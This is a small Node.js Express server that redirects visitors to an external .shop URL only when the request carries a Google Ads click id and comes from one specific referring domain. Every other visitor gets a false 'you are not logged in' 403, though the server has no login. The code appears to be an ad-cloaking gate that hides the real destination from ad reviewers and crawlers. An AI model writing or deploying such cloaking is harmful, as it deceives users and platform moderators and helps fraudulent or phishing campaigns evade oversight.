const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000;
const ALLOWED_DOMAIN = "refliefcart.shop";

app.get("/", (req, res) => {
  const gclid = req.query.gclid;
  const referer = req.headers.referer || "";
  const origin = req.headers.origin || "";

  const fromAllowedDomain =
    referer.includes(ALLOWED_DOMAIN) || origin.includes(ALLOWED_DOMAIN);

  if (gclid && fromAllowedDomain) {
    return res.redirect(302, "https://fooidemix.shop/map/latest");
  }

  res.status(403).send("you are not logged in");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
